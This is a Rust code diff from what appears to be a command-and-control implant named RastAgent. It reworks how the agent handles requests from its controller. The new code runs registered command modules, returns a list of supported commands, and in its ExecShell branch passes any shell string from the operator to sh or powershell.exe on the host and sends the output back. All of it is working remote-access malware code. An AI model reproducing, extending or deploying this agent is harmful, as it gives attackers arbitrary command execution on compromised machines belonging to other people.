@@ -15,7 +15,10 @@ use rast::{
 use tokio::{process::Command as SystemCommand, sync::Mutex};
 use tracing::{debug, info};
 
-use crate::context::Context;
+use crate::{
+    commands::{Command, CommandOutput},
+    context::Context,
+};
 
 pub mod commands;
 pub mod context;
@@ -87,9 +90,10 @@ impl RastAgent {
 
                 let response = self.handle_message(msg).await;
 
-                let Ok(response) = response else {
-                     continue
-                };
+                let response = response.unwrap_or(AgentMessage::AgentResponse(
+                    AgentResponse::Error("Err".to_string()),
+                ));
+                debug!("Response: {response:?}");
 
                 let response = match packager.encode(&response) {
                     Ok(serialized) => serialized,
@@ -110,30 +114,51 @@ impl RastAgent {
     }
 
     async fn handle_message(&self, msg: AgentMessage) -> Result<AgentMessage, RastError> {
-        let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
-            debug!("Got unsupported request: {:?}", msg);
-            return Err(RastError::Unknown);
+        let AgentMessage::C2Request(req) = msg else { todo!() };
+
+        let output = match req {
+            C2Request::ExecCommand(cmd, args) => {
+                if let Some(cmd) = self.commands.get_command(cmd) {
+                    let output = cmd.execute(self.context.clone(), args).await?;
+                    let output = match output {
+                        CommandOutput::Nothing => "".to_string(),
+                        CommandOutput::Text(txt) => txt,
+                        CommandOutput::ListText(txts) => txts.join("\n"),
+                    };
+                    AgentResponse::CommandOutput(output)
+                } else {
+                    AgentResponse::Error("Command not found".to_string())
+                }
+            },
+            C2Request::ExecShell(cmd) => {
+                let dir = self.context.read().unwrap().get_dir();
+                let shell = if cfg!(target_os = "windows") {
+                    "powershell.exe"
+                } else {
+                    "sh"
+                };
+
+                let output = SystemCommand::new(shell)
+                    .current_dir(dir)
+                    .arg("-c")
+                    .arg(cmd)
+                    .output()
+                    .await;
+
+                info!("Response {:?}", output);
+                let response = match output {
+                    Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
+                    Err(e) => e.to_string(),
+                };
+
+                AgentResponse::ShellResponse(response)
+            },
+            C2Request::GetCommands => {
+                AgentResponse::Commands(self.commands.get_supported_commands())
+            },
         };
 
-        let output = if cfg!(target_os = "windows") {
-            SystemCommand::new("powershell.exe")
-                .arg("-c")
-                .arg(cmd)
-                .output()
-                .await
-        } else {
-            SystemCommand::new("sh").arg("-c").arg(cmd).output().await
-        };
-
-        info!("Response {:?}", output);
-        let response = match output {
-            Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
-            Err(e) => e.to_string(),
-        };
-
-        let response = AgentMessage::AgentResponse(AgentResponse::CommandResponse(response));
-
-        Ok(response)
+        Ok(AgentMessage::AgentResponse(output))
     }
 }
 
